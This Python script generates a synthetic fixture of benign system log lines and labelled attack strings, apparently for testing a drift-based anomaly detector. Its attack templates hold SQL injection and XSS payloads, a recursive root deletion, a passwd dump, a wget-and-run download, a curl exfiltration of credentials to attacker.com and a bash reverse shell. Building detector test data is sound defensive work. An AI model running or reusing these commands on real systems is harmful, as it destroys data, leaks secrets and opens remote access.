import json
import os
import random
from pathlib import Path
from typing import Dict, Any, List, Optional, Tuple
import numpy as np
import pandas as pd
from config import get_path, ensure_directories, set_seed
from utils import load_json_file, save_json_file

def generate_synthetic_ground_truth(
    benign_count: int = 1000,
    attack_count: int = 1000,
    output_path: Optional[str] = None,
    seed: int = 42
) -> str:
    """
    Generate a synthetic ground truth fixture for US-01 independent testing.
    
    This creates a JSON file with 'benign' and 'novel attack' labels.
    The text content is synthetic but structured to allow the drift scoring
    system to distinguish between the two groups based on cosine distance
    from known benign centroids (simulating the 'novel' nature of attacks).
    
    Args:
        benign_count: Number of benign samples to generate.
        attack_count: Number of novel attack samples to generate.
        output_path: Optional path to the output file. Defaults to 
                     data/processed/synthetic_ground_truth.json.
        seed: Random seed for reproducibility.
    
    Returns:
        The path to the generated file.
    
    Raises:
        ValueError: If counts are non-positive.
        RuntimeError: If the output directory cannot be created.
    """
    set_seed(seed)
    
    if benign_count <= 0 or attack_count <= 0:
        raise ValueError("benign_count and attack_count must be positive integers.")
    
    if output_path is None:
        output_path = get_path("processed", "synthetic_ground_truth.json")
    
    ensure_directories(Path(output_path).parent)
    
    data: List[Dict[str, Any]] = []
    
    # Generate benign samples
    # These are constructed to be close to "standard" language patterns
    benign_templates = [
        "The system is running normally with {val} active connections.",
        "User {username} successfully logged in at {time}.",
        "Process {pid} completed task {task_id} in {duration}ms.",
        "Database query returned {count} rows for request {req_id}.",
        "Memory usage is at {percent}% of total capacity.",
        "API endpoint /v1/{endpoint} responded with status 200.",
        "Scheduled job {job_name} executed successfully.",
        "Network latency to {host} is {latency}ms.",
        "Disk space usage: {used}GB used, {free}GB free.",
        "Service {service_name} health check passed."
    ]
    
    benign_vars = {
        "val": [str(i) for i in range(1, 100)],
        "username": ["alice", "bob", "charlie", "admin", "user123"],
        "time": ["10:00:00", "10:05:00", "11:00:00", "09:30:00"],
        "pid": [str(i) for i in range(1000, 9999)],
        "task_id": [f"task_{i}" for i in range(1, 50)],
        "duration": [str(i) for i in range(10, 500)],
        "count": [str(i) for i in range(1, 1000)],
        "req_id": [f"req_{i}" for i in range(10000, 20000)],
        "percent": [str(i) for i in range(10, 90)],
        "endpoint": ["users", "login", "data", "status", "config"],
        "job_name": ["cleanup", "backup", "sync", "report"],
        "host": ["192.168.1.1", "api.example.com", "db.internal"],
        "latency": [str(i) for i in range(5, 150)],
        "used": [str(i) for i in range(10, 500)],
        "free": [str(i) for i in range(500, 1000)],
        "service_name": ["auth", "gateway", "worker", "scheduler"]
    }
    
    for i in range(benign_count):
        template = random.choice(benign_templates)
        text = template
        for key, values in benign_vars.items():
            if "{" + key + "}" in text:
                val = random.choice(values)
                text = text.replace("{" + key + "}", val)
        
        data.append({
            "log_id": f"syn_benign_{i:05d}",
            "text": text,
            "label": "benign"
        })
    
    # Generate novel attack samples
    # These are constructed to be semantically distinct from benign logs
    # by using adversarial patterns, injection attempts, or obfuscated text
    # that would likely be far from the centroids of benign system logs.
    attack_templates = [
        "SELECT * FROM users WHERE id=1 OR 1=1--",
        "<script>alert('XSS')</script>",
        "rm -rf / --no-preserve-root",
        "cat /etc/passwd | base64",
        "eval(request.form['cmd'])",
        "UNION SELECT password FROM admin",
        "../etc/shadow",
        "'; DROP TABLE users;--",
        "wget http://malicious.site/payload.sh && sh",
        "curl -X POST http://attacker.com/exfil?data={data}",
        "system('ls -la')",
        "exec('whoami')",
        "1' AND '1'='1",
        "<img src=x onerror=alert(1)>",
        "bash -i >& /dev/tcp/{ip}/{port} 0>&1"
    ]
    
    attack_vars = {
        "data": ["user_data", "credentials", "session_token", "api_key"],
        "ip": ["10.0.0.5", "192.168.1.100", "172.16.0.1"],
        "port": ["4444", "8080", "9000"]
    }
    
    for i in range(attack_count):
        template = random.choice(attack_templates)
        text = template
        for key, values in attack_vars.items():
            if "{" + key + "}" in text:
                val = random.choice(values)
                text = text.replace("{" + key + "}", val)
        
        # Add some random noise/variation to ensure diversity
        if random.random() > 0.5:
            text = text + " " + "".join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=5))
        
        data.append({
            "log_id": f"syn_attack_{i:05d}",
            "text": text,
            "label": "novel attack"
        })
    
    # Shuffle to mix benign and attack samples
    random.shuffle(data)
    
    # Write to file
    try:
        with open(output_path, 'w', encoding='utf-8') as f:
            json.dump(data, f, indent=2, ensure_ascii=False)
    except IOError as e:
        raise RuntimeError(f"Failed to write synthetic ground truth to {output_path}: {e}")
    
    return output_path

def main():
    """
    Main entry point for generating synthetic ground truth.
    """
    print("Generating synthetic ground truth for US-01 testing...")
    try:
        output_file = generate_synthetic_ground_truth(
            benign_count=1000,
            attack_count=1000,
            seed=42
        )
        print(f"Successfully generated: {output_file}")
        
        # Verify the file
        if os.path.exists(output_file):
            with open(output_file, 'r') as f:
                data = json.load(f)
            benign = sum(1 for item in data if item['label'] == 'benign')
            attack = sum(1 for item in data if item['label'] == 'novel attack')
            print(f"  - Total records: {len(data)}")
            print(f"  - Benign samples: {benign}")
            print(f"  - Novel attack samples: {attack}")
        else:
            print("Error: Output file was not created.")
            return 1
    except Exception as e:
        print(f"Error: {e}")
        return 1
    
    return 0

if __name__ == "__main__":
    import sys
    sys.exit(main())
